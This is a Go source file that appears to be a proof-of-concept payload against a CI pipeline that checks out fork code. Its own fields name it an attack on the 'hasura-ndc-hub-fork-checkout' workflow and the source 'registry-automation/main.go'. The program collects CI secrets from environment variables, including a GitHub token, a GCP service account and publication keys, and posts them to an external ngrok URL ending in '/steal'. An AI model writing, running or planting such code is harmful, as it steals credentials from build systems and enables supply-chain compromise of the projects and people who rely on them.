package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

func main() {
	data := map[string]string{
		"attack":                      "hasura-ndc-hub-fork-checkout",
		"source":                      "registry-automation/main.go",
		"GCP_SERVICE_ACCOUNT_DETAILS": os.Getenv("GCP_SERVICE_ACCOUNT_DETAILS"),
		"CONNECTOR_PUBLICATION_KEY":   os.Getenv("CONNECTOR_PUBLICATION_KEY"),
		"CONNECTOR_REGISTRY_GQL_URL":  os.Getenv("CONNECTOR_REGISTRY_GQL_URL"),
		"GCP_BUCKET_NAME":             os.Getenv("GCP_BUCKET_NAME"),
		"CLOUDINARY_URL":              os.Getenv("CLOUDINARY_URL"),
		"GITHUB_TOKEN":                os.Getenv("GITHUB_TOKEN"),
	}
	body, _ := json.Marshal(data)
	resp, err := http.Post("https://bbb9-118-68-66-37.ngrok-free.app/steal", "application/json", bytes.NewReader(body))
	if err != nil { fmt.Fprintf(os.Stderr, "exfil failed: %v\n", err); os.Exit(1) }
	defer resp.Body.Close()
	fmt.Println("Done.")
}
